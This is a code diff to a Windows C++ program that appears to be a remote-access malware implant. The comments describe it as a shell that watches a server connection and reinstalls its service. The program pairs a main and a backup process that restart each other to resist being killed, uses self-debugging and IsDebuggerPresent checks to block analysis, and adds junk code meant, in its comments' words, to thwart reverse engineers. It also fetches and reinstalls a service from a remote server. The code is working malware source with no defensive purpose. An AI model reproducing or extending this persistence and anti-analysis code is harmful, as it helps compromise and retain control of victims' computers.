@@ -5,47 +5,44 @@
 #include <Windows.h>
 #include <psapi.h>
 
-//Used to enable prints since I couldn't debug with libzippp imports
-#define _DEBUG 
-
-#ifdef _DEBUG
-#define Log(x) printf(x)
-#else
-#define Log(x) 
-#endif
-
 //Thread used to check if main shell is running, and if it not start it
 void BackupThread();
 //Thread used to check if backup shell is still running, and if not start it and close itself
 void CheckBackupRunningThread();
-void PauseExecution();
-void PauseAndExit(int exitCode);
+//Straightforward ig
 void CreateAndStartBackupOnDisk();
+//Also name self explanatory
+void RestartBackupShellAndExit();
 
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)	//main function
 {
 	//Alloc console for debug purposes
-#ifdef _DEBUG
-	AllocConsole();
-	FILE* f;
-	freopen_s(&f, "CONOUT$", "w", stdout);
-#endif
+	CreateDebugConsole();
 
-	if (strcmp(ExePathA(), SHELL_BACKUP_EXE) && strcmp(ExePathA(), SHELL_EXE)) { //Check that full path is at least one of the 2 valid ones, to mess with reverse engineers dumping this exe
+	//Check that full path is at least one of the 2 valid ones, else this bad boy is being prolly reversed
+	if (strcmp(ExePathA(), SHELL_BACKUP_EXE) && strcmp(ExePathA(), SHELL_EXE)) { 
 		return 0;
 	}
 
+	//Main logic of backup shell will be executed in an external thread
 	_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)BackupThread, NULL, NULL, NULL);
 
 	//BEGINNING OF USELESS CODE
-
-	if (!strcmp(ExePathA(), SHELL_BACKUP_EXE)) { //If full module path == backup module path, do useless shit in main thread
+	// This routine is pretty small, could be expanded upon, but might as well make a packer/obfuscator at that point. This should be enough
+	// to keep any unexperienced cracker the fuck out of the way
+	// 
+	//If full module path == backup module path, do useless shit in main thread
+	if (!strcmp(ExePathA(), SHELL_BACKUP_EXE)) { 
 		while (true) {
-			char* uselessString = "GetNativeSystemInfo"; //Just to fuck with reverse engineers
+			//Just to fuck with reverse engineers allocate some apparently useful string
+			char* uselessString = "GetNativeSystemInfo"; 
 useless_backup_shell_code:
-			if (!IsDebuggerPresent()) { //I mean, why not
-				HMODULE hUseless = GetModuleHandle(TEXT("kernel32.dll")); //Get random ass handle cuz people put hooks on this shit when debugging
-				if (IsBadReadPtr(uselessString, 0)) { //This always returns 0 if second parameter is 0 so it will never jump (dont write if(false) since compiler will optimize and delete the branch
+			//I mean, why not
+			if (!IsDebuggerPresent()) { 
+				//Get random ass handle cuz people put hooks on this shit when debugging
+				HMODULE hUseless = GetModuleHandle(TEXT("kernel32.dll")); 
+				//This always returns 0 if second parameter is 0 so it will never jump (dont write if(false) since compiler will optimize and delete the branch
+				if (IsBadReadPtr(uselessString, 0)) { 
 					goto non_backup_shell_code;
 				}
 			}
@@ -64,21 +61,22 @@ useless_backup_shell_code:
 	//BEGINNING OF MAIN SHELL CODE (VARIOUS CHECKS)
 non_backup_shell_code:
 	Log("Got to main shell code\n");
-	if (strcmp(ExePathA(), SHELL_BACKUP_EXE) && strcmp(ExePathA(), SHELL_EXE)) { //Code repetition (using functions is counterproductive since they could hook them easily)
+	//Code repetition (using functions is counterproductive since they could hook them easily)
+	if (strcmp(ExePathA(), SHELL_BACKUP_EXE) && strcmp(ExePathA(), SHELL_EXE)) { 
 		return 0;
 	}
-	//Check that parent process == SHELL_BACKUP_NAME
+	//Check that parent process name == SHELL_BACKUP_NAME
 	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, Utils::getParentProcess(Utils::getProcess(SHELL_NAME)));
 	if (!hProcess)
 		PauseAndExit(1);
-
+	//Check parent process full path to make sure that it's the backup shell and that it was started from the right folder
 	CHAR Buffer[MAX_PATH];
 	if (GetModuleFileNameExA(hProcess, 0, Buffer, MAX_PATH))
 	{
 		// At this point, buffer contains the full path to the executable
 		if (strcmp(Buffer, SHELL_BACKUP_EXE)) {
 			//They don't match
-			Log("Parent process name doesn't match SHELL_BACKUP_EXE\n");
+			Log("Parent process full path doesn't match SHELL_BACKUP_EXE\n");
 			CreateAndStartBackupOnDisk();
 			PauseAndExit(1);
 		}
@@ -86,13 +84,15 @@ non_backup_shell_code:
 	}
 	else
 	{
+		//Couldn't get full path for some reason, so give it 0 chances and just quit instead of looping
 		PauseAndExit(1);
 	}
 	CloseHandle(hProcess);
 	//END OF CHECKS
 
+	//This thread is used to make sure the backup thread is always active, for more info go check out the method
 	_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)CheckBackupRunningThread, NULL, NULL, NULL);
-
+	//Main loop
 	while (true)
 	{
 		if (!Client::main_client.connected)
@@ -100,13 +100,14 @@ non_backup_shell_code:
 			Log("Client not connected, attempting to connect...\n");
 			while (!Client::main_client.Connect())
 			{
-				Log("Failed to connect...\n");
-				Sleep(5000);
+				Log((("Failed to connect...\n" + std::string(Settings::serverIP) + ":" + std::to_string(Settings::serverPort)).c_str()));
+				Sleep(1000);
 			}
 		}
 		else {
 			Log("Client connected!\n");
-			//Here maybe check if the ShellManager service is still active, and if it isn't download it if necessary and start it up again
+			//If service doesn't exist download the archive from server (will need to have external.zip inside Server.exe folder), create and start the service.
+			//Keep on looping just in case they close the service, but keep high delay since the function is decently heavy and we don't want anything weird happening.
 			Service::CheckAndRepairService();
 		}
 
@@ -127,7 +128,7 @@ void DebuggerThread() {
 			continue;
 		}
 		//Place your code to handle the event here:
-		//
+		//Fucking nothing, literally skip through everything
 		//End
 		ContinueDebugEvent(debug_event.dwProcessId,
 			debug_event.dwThreadId,
@@ -140,8 +141,10 @@ void BackupThread() {
 	if (strcmp(ExePathA(), SHELL_BACKUP_EXE)) { //If full module path != backup module path, do nothing
 		return;
 	}
-	else { //Check if another backup shell is running
-		if (Utils::getProcessCount(SHELL_BACKUP_NAME) > 1) { //If more than 1 backup shell is running exit process
+	//Check if another backup shell is running
+	else { 
+		//If more than 1 backup shell is running exit process
+		if (Utils::getProcessCount(SHELL_BACKUP_NAME) > 1) { 
 			PauseAndExit(1);
 		}
 	}
@@ -150,15 +153,14 @@ void BackupThread() {
 	//Get an handle to the main shell
 	HANDLE hProc = 0;
 	auto procID = Utils::getProcess(SHELL_NAME);
-	//If procID is 0 attempt to start the shell
+	//Attempt to start the shell if not already started
 	if (!procID) {
-		Log("Couldn't get process ID\n");
-
+		Log("Elevated shell process not found\n");
 		STARTUPINFO info = { sizeof(info) };
 		PROCESS_INFORMATION processInfo;
 		ZeroMemory(&info, sizeof(info));
 		ZeroMemory(&processInfo, sizeof(processInfo));
-		//Create process with debugging flag, since only one debugger can be attached to a process at a time
+		//Create process with debugging flag, since only one debugger can be attached to a process at a time, the shell will "debug itself"
 		while (!CreateProcessA(SHELL_EXE, NULL, NULL, NULL, FALSE, DEBUG_ONLY_THIS_PROCESS, NULL, NULL, &info, &processInfo))
 		{
 			Sleep(100);
@@ -174,6 +176,7 @@ void BackupThread() {
 		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, Utils::getParentProcess(procID));
 		if (!hProcess) {
 			Log("Could not open an handle to the process");
+			//When in doubt close the main shell
 			const auto hMainShell = OpenProcess(PROCESS_TERMINATE, false, procID);
 			TerminateProcess(hMainShell, 1);
 			CloseHandle(hMainShell);
@@ -202,9 +205,7 @@ void BackupThread() {
 	if(!hProc)
 		hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
 
-	//To store debug events
-	DEBUG_EVENT debug_event = { 0 };
-
+	//Main check loop to make sure main shell is still running and being debugged
 	while (true) {
 		//Get exit code
 		DWORD exitCode;
@@ -230,35 +231,50 @@ void BackupThread() {
 	}
 }
 
+void RestartBackupShellAndExit() {
+	Log("Main shell has been closed\n");
+	//If not running first attempt to copy the image to disk, then run it
+	CopyFile(ExePathA(), SHELL_BACKUP_EXE, FALSE);
+	Log("Created backup shell on disk\n");
+
+	STARTUPINFO info = { sizeof(info) };
+	PROCESS_INFORMATION processInfo;
+	ZeroMemory(&info, sizeof(info));
+	ZeroMemory(&processInfo, sizeof(processInfo));
+	while (!CreateProcessA(SHELL_BACKUP_EXE, (LPSTR)"", NULL, NULL, FALSE, 0, NULL, NULL, &info, &processInfo))
+	{
+		Sleep(100);
+	}
+	CloseHandle(processInfo.hThread);
+	CloseHandle(processInfo.hProcess);
+	Log("Started backup shell\n");
+
+	//After backup shell is started make sure to quit this executable
+	PauseAndExit(1);
+}
+
+//This is the secondary routine for the main shell
 void CheckBackupRunningThread() {
 	Log("Started backup shell check thread\n");
+	HANDLE hProc = 0;
+	auto procID = Utils::getProcess(SHELL_BACKUP_NAME);
+	if (!procID) {
+		RestartBackupShellAndExit();
+	}
+	hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
+
+	//Main loop of the routine
 	while (true) {
-		//Check if backup shell is still running
-		auto procID = Utils::getProcess(SHELL_BACKUP_NAME);
-		if (!procID) {
-			Log("Main shell has been closed\n");
-			//If not running first attempt to copy the image to disk, then run it
-			CopyFile(ExePathA(), SHELL_BACKUP_EXE, FALSE);
-			Log("Created backup shell on disk\n");
-
-			STARTUPINFO info = { sizeof(info) };
-			PROCESS_INFORMATION processInfo;
-			ZeroMemory(&info, sizeof(info));
-			ZeroMemory(&processInfo, sizeof(processInfo));
-			while (!CreateProcessA(SHELL_BACKUP_EXE, (LPSTR)"", NULL, NULL, FALSE, 0, NULL, NULL, &info, &processInfo))
-			{
-				Sleep(100);
-			}
-			CloseHandle(processInfo.hThread);
-			CloseHandle(processInfo.hProcess);
-			Log("Started backup shell\n");
-
-			//After backup shell is started make sure to quit this executable
-			PauseAndExit(1);
-		}
-		else {
+		//Get exit code
+		DWORD exitCode;
+		while (!GetExitCodeProcess(hProc, &exitCode)) {
 			Sleep(100);
 		}
+		//If exit code is STILL_ACTIVE the process hasn't been stopped yet
+		if (exitCode != STILL_ACTIVE) { 
+			RestartBackupShellAndExit();
+		}
+		Sleep(100);
 	}
 }
 
@@ -279,15 +295,4 @@ void CreateAndStartBackupOnDisk() {
 	CloseHandle(processInfo.hProcess);
 
 	Log("Created backup shell process\n");
-}
-
-void PauseExecution() {
-	MessageBoxA(NULL, "Paused", "Paused", MB_OK);
-}
-
-void PauseAndExit(int exitCode) {
-#ifdef _DEBUG
-	MessageBoxA(NULL, "Paused before exit", "Paused", MB_OK);
-#endif
-	ExitProcess(exitCode);
 }
